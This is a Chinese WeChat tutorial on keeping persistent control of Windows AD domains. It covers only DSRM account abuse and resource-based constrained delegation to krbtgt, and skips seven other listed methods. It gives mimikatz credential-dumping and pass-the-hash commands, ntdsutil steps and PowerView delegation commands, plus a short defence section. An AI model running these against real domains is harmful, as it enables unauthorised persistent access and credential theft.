<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SF78IkqabljXVl8r2Ut5rw)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODu2RQGHiaNnzVtt5QoLVc1Oh0icPkwib63LRAdGgayaiagSDgVYnb6gWHJsbeYib87NEgbGnWBElkkMxoQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

点击上方 “蓝字”，关注更多精彩

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODu2RQGHiaNnzVtt5QoLVc1OhkhsoYQiaYl2YU9WGqw4VPmiaWYX4xdIj5RMcibL7l5hILyibfSCbYicicfPw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

前言
--

域内权限维持的方法总结如下:

1.  DSRM
    
2.  利用基于资源的约束委派进行域权限维持（约束委派）
    
3.  ACL 策略后门
    
4.  Delegation Golden Ticket
    
5.  利用域用户登陆脚本
    
6.  万能密码 (Skeleton-Key)
    
7.  黄金票据
    
8.  AdminSDHolder
    
9.  SID History 后门
    

技术展开
----

### DSRM

#### 原理：

在每个域控机器下都有一个 DSRM 帐户，为 DC 的本地管理员账户，这个帐户的作用就是用来设定登陆服务还原模式 AD 节点的系统管理员密码，意思就是可以从新设置 DC 管理员的密码，在红队作战中，如果我们拿到了 DSRM 帐户的密码，就算哪天域管权限丢失, 我们也可以把域内任意用户的密码同步到 DSRM 账户上 [这里包括了 dc 本地的 admainistrator 用户], 而后再利用 DSRM 账户 ipc 连到 dc 上把域管权限拿回来。

<!--DSRM 账户是域控的本地管理员账户，并非域的管理员帐户，存储在 SAM 文件中，所以 DSRM 密码同步之后并不会影响域的管理员帐户，另外，在下一次进行 DSRM 密码同步之前，NTLM 的值一直有效，且更改域内的 administrator 帐户，并不会影响 DSRM 帐户，持久化效果会很好 -->

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGjr7gA2ZhibLvQ6c46QGAzAm0eu3EpnzvjvricZrib9kyUpqMEb4hiap732w/640?wx_fmt=png)

小细节：

```
Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步
Windows Server 2003不支持DSRM密码同步
```

#### 利用方式：

攻击者将 DSRM 账户的 hash 与 krbtgt 同步，就算此时应急改变 DC 的 administrator 的密码，也可以继续利用 pth 哈希传递攻击。

需要的条件：

1.  此攻击需要使用 DC 的 ntdsutil 来修改 DSRM 账户的密码。
    
    1.1 直接修改 DSRM 帐户的密码
    
    1.2 域帐户同步的方式来修改
    
2.  需要修改 DSRM 的登录方式。
    
    2.1 通过注册表修改
    

#### 实际操作：

域帐户同步的方式来修改 DSRM 帐户的密码

```
set dsrm password
sync from domain account 域用户
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGjG697MRwftJFNBN1JcgkacGBFVIjfibvIIsf74bHMW0FOGVS0IMYZUOg/640?wx_fmt=png)

直接修改 DSRM 帐户的密码（这种需要之前的 administrator 帐户密码）

```
运行 ntdsutil
#输入
reset password on server null
administrator帐户的密码
DSRM新密码
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGjbjc6zPS9COImpnHXQlSS651ulTnU1Qzu2UFq4O7mZCKlkLbF2aYLIA/640?wx_fmt=png)

获取本地 SAM 数据库的密码：

```
token::elevate
lsadump::sam
```

发现 hash 已经与域用户 admin hash 同步了

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGjsYcaIBAGtCkYcRb5zsEM67Oeneiaavdq1u4bWkNIRUiarsaymyrFs14Q/640?wx_fmt=png)

修改 DSRM 登陆方式，允许 DSRM 帐户远程访问：

需设置注册表项，如果没有，则新建，计算机 \ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa，设置值参考如下：

0：默认值，只有当域控重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号。

1：只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控。

2：在任何情况下，都可以使用 DSRM 管理员账号登录域控。

我们需设置为 2

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGjQMtC8p9rend8qAafZib0P3GzQWnLbsn3T6EoKNLwqaWwW0vZEP2gmUg/640?wx_fmt=png)

然后 mimikatz pth

```
sekurlsa::pth /domain:DC /User:administrator /ntml:hash
dir /a \\DC\C$
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGjokz18LFTFRpjLGRdQxYgBHdFdXlNIeweblpELQkXEvfsNiacTfUExBQ/640?wx_fmt=png)

防御与检测：

```
1.定期检查注册表中用于控制DSRM登录方式的键值hklm:\system\currentcontrolset\control\lsa\确认该键值为1，或者删除该键值。
2.定期修改域中所有域控的DSRM账号。
3.检查ID为4794的日志
```

### 利用基于资源的约束委派进行域权限维持

#### 原理：

基于资源的约束委派（Resource-based constrained delegation）是在 Windows Server 2012 中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD 把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。

利用原理：给 DC 或者 krbtgt 设置我们控制的主机资源的基于资源的委派，那么就能控制 DC，达到权限维持的目的。

约束委派一个道理，这里就不多说了。

#### 利用方式：

主要有两种方法：

1.  配置机器帐户到 krbtgt 帐户基于资源的约束委派
    
2.  配置机器帐户到域控基于资源的约束委派
    

#### 实际操作：

配置机器帐户到 krbtgt 帐户基于资源的约束委派，使用的工具模块为 Powerview：

值得注意的是，基于资源的委派，必须是委派双方需资源，例如机器帐户，服务帐户什么的，不能是域用户，下面尝试使用设置域用户帐户设置基于资源的委派，发现能设置，但是实际上是用不了

1.  获取 test1 域用户的 sid
    

```
Get-DomainUser -Identity test1 -Properties objectsid
#S-1-5-21-2288091295-2811714918-3159536460-1107
```

2.  设置 test1 到 krbtgt 的基于资源的委派
    

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2288091295-2811714918-3159536460-1107)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject krbtgt -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

需要域管理员权限才能设置，不然就会拒绝访问

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGj5Pm9BUb3PLQFvAjlnKB7t01anFBs0ZvaAIRqD3VBOibiaXJjKu6F9Zvg/640?wx_fmt=png)

3. 查看是否设置成功

```
Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGjIOiaLAlfd6usoXBTAb6WvScIAiaiaMmsj3qSP2ODNAYIrBsoohCujUh5A/640?wx_fmt=png)

也可以通过`ActiveDirectory`模块添加：

> 只有 Windows Server 2012 以及以上的`ActiveDirectory`模块才有 - PrincipalsAllowedToDelegateToAccount 选项

```
Set-DomainObject Krbtgt -PrincipalsAllowedToDelegateToAccount test1
Get-DomainObject Krbtgt -Properties PrincipalsAllowedToDelegateToAccount
```

4. 利用 test1 域用户请求 TGT：

```
getst.exe -dc-ip 192.168.140.1 -spn krbtgt -impersonate Administrator redteamspace.com/test1:1qaz@WSX
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGj6vLviaSFic6aBcWEr6uPiab4yCyIBJUvqd3QVUTC5JicLzjibxqPyR2XDlw/640?wx_fmt=png)

可以看到，实际上是用不了的

所以这里重新配置机器帐户到 krbtgt 帐户基于资源的约束委派，步骤相同，只需要把 test1 改成机器帐户，或者服务帐户

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGjXZlZzJRkRZicsayCWfyZicibj1ZaSibicKsibc1X3Vqic4bxDFkiaBvOuc2GicA/640?wx_fmt=png)

这里就能成功请求到票据了

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODviacCXRLXd1XSic6zeAFWjGjHmNbVDfvuxd6ekT0DxBY5c9dkvHiaTKOpTU9M10mtw7cT9tRicz4ia4xA/640?wx_fmt=png)

这里就有 DCSync 的权限了，但如果要访问域控，那么 krbtgt 就得改成域控的机器帐户名了，或者其他服务。

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

END

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtIZ5VYusLbEoY8iaTjibTWg6AKjAQiahf2fctN4PSdYm2O1Hibr56ia39iaJcxBoe04t4nlYyOmRvCr56Q/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

**看完记得点赞，关注哟，爱您！**

**请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

关注此公众号，回复 "Gamma" 关键字免费领取一套网络安全视频以及相关书籍，公众号内还有收集的常用工具！

  

**在看你就赞赞我！**

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbThXaInFkmyjOOcBoNCXGun5icNbT4mjCjcREA3nMN7G8icS0IKM3ebuLA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTkwLkofibxKKjhEu7Rx8u1P8sibicPkzKmkjjvddDg8vDYxLibe143CwHAw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_jpg/96Koibz2dODuKK75wg0AnoibFiaUSRyYlmhIZ0mrzg9WCcWOtyblENWAOdHxx9BWjlJclPlVRxA1gHkkxRpyK2cpg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

扫码关注我们

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

扫码领 hacker 资料，常用工具，以及各种福利

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTnHS31hY5p9FJS6gMfNZcSH2TibPUmiam6ajGW3l43pb0ySLc1FibHmicibw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

转载是一种动力 分享是一种美德